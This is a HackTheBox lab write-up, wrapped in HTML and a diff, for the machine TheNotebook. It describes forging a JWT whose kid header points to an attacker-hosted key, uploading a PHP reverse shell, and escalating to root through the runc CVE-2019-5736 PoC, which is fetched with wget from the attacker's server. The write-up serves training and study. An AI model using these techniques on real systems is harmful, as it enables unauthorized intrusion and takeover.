@@ -1,0 +1,155 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - TheNotebook // SixPraxis</title>
+    <link rel="shortcut icon" href="/images/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.82.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="SixPraxis" />
+    <meta name="description" content="Write Up for HackTheBox&#39;s TheNotebook" />
+    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.802b52396e9009f466997720acea24d1773f8e6e5db6e4793067fa2dfd981e02.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - TheNotebook"/>
+<meta name="twitter:description" content="Write Up for HackTheBox&#39;s TheNotebook"/>
+
+    <meta property="og:title" content="HTB - TheNotebook" />
+<meta property="og:description" content="Write Up for HackTheBox&#39;s TheNotebook" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sixpraxis.github.io/posts/thenotebook/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-31T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2021-07-31T00:00:00&#43;00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
+      <h1>SixPraxis</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
+  <title>HackTheBox</title>
+  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - TheNotebook</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 31, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/thenotebook/">thenotebook</a>
+              <a class="tag" href="https://sixpraxis.github.io/tags/medium/">medium</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="thenotebook">TheNotebook</h1>
+<p>![TheNotebook]/images/htb-thenotebook/thenotebook.png)</p>
+<h3 id="contents">Contents</h3>
+<ul>
+<li><a href="#WriteUp">Write Up</a></li>
+<li><a href="#Recon">Recon</a></li>
+<li><a href="#Credentials">Credentials</a></li>
+<li><a href="#Notes">Notes</a></li>
+</ul>
+<h2 id="WriteUp">Write Up</h2>
+<p>Two open ports, 22 and 80, one filtered port 10010. Pulling up the website takes us to a notebook page with a register and login link. Let&rsquo;s look around.</p>
+<p>![Welcome Page]/images/htb-thenotebook/thenotebook1.png)</p>
+<p>The register page lets you sign up without verification. I made a user <code>test1 : password1</code>. The log in page provides error messages that let you verify if a user exists, &ldquo;admin&rdquo; exists. After logging in you can create a note with a title and text. Each note has it&rsquo;s own url, built from the accounts uuid(found in a cookie), and a number which increments with each new note. Example: <code>http://thenotebook.htb/57a7d53c-0b83-4048-a3e6-506a0c2b4e13/notes/5</code>. My notes started with 5, 0-4 give an Unauthorized error. Even after logging out, the notes are still accessible by url. Putting a curly brace in the title when adding a note causes an internal error. WFuzz shows an admin page that gives a Forbidden error.</p>
+<p>After a while of stumbling around, I got lucky while looking at things in burpsuite. The auth cookie is part base64 and Burp&rsquo;s inspector automatically translated it for me when I clicked on that part, revealing that it&rsquo;s a JWT token. I used <a href="https://jwt.io/introduction">https://jwt.io/introduction</a> to bring me up to speed.</p>
+<p>The header and payload sections of the token translate to:</p>
+<pre><code>{&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;kid&quot;:&quot;http://localhost:7070/privKey.key&quot;}
+{&quot;username&quot;:&quot;test1&quot;,&quot;email&quot;:&quot;test1@test.test&quot;,&quot;admin_cap&quot;:0}
+</code></pre><p>We need to change that admin_cap to 1 and change the kid value to point to our own private key to verify the token. To do this I used <a href="https://github.com/ticarpi/jwt_tool">ticarpi&rsquo;s JSON Web Token Toolkit v2</a>.</p>
+<pre><code>python3 jwt_tool.py jwt.original -T -S rs256 -pr key.key
+[3] kid = &quot;http://10.10.14.8/key.key&quot;
+[3] admin_cap = 1
+</code></pre><p>I spin up my web server with the private key for verification and set my thenotebook.htb cookie to contain the new jwt token in the auth field. Navigating to <a href="http://thenotebook.htb/admin">http://thenotebook.htb/admin</a> works instead of giving us a Forbidden error! There&rsquo;s a view notes button and an upload file button. One of the notes mentions that uploaded php files are being executed. I upload a php reverse shell and hit the view button to trigger it. Our listener pops a shell as www-data. User.txt is only readable by user &ldquo;noah&rdquo;.</p>
+<p>In the /var/backups folder we find a copy of noah&rsquo;s home folder(no user.txt), with his private and public ssh keys and an authorized_keys file with his public key loaded in. After copying the private key over and making sure perms are set to 600, we can connect as noah and get the user flag.</p>
+<p>![User Flag]/images/htb-thenotebook/thenotebook2.png)</p>
+<p>Sudo -l shows <code>(ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*</code>. After some research, I find <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736,">https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736,</a> and <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a>. I modified the PoC to run a reverse shell script that I&rsquo;ve downloaded the target machine and built it with <code>go build main.go</code>, then moved the main binary to my web server. On the target machine I execute <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash</code> to drop into the docker container, then <code>cd /tmp/ &amp;&amp; wget http://10.10.14.8/main &amp;&amp; chmod 777 main</code>. I open up a second shell as noah and ready the command <code>sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh</code>, but don&rsquo;t hit enter yet. On the first shell I run the main binary <code>./main</code>, then when it says [+] Overwritten /bin/sh successfully, I execute the /bin/sh command on the second shell to trigger the exploit. It successfully writes and pops a root shell on my listener!</p>
+<p>![Main binary execution]/images/htb-thenotebook/thenotebook3.png)</p>
+<p>![Root Flag]/images/htb-thenotebook/thenotebook4.png)</p>
+<hr>
+<h2 id="Recon">Recon</h2>
+<p>Nmap Scan:</p>
+<pre><code>nmap -p22,80,10010 -sV -sC -Pn 10.10.10.230
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+80/tcp    open     http    nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: The Notebook - Your Note Keeper
+10010/tcp filtered rxapi
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+</code></pre><p>Wfuzz:</p>
+<pre><code>wfuzz -c -u http://thenotebook.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                              
+=====================================================================
+000000065:   200        32 L     104 W      1422 Ch     &quot;register&quot;                           
+000000053:   200        30 L     94 W       1250 Ch     &quot;login&quot;                              
+000000259:   403        0 L      1 W        9 Ch        &quot;admin&quot;                              
+000001225:   302        3 L      24 W       209 Ch      &quot;logout&quot;                             
+</code></pre><hr>
+<h2 id="Credentials">Credentials</h2>
+<hr>
+<h2 id="Notes">Notes</h2>
+<ul>
+<li>Created web account | test1 : password1</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
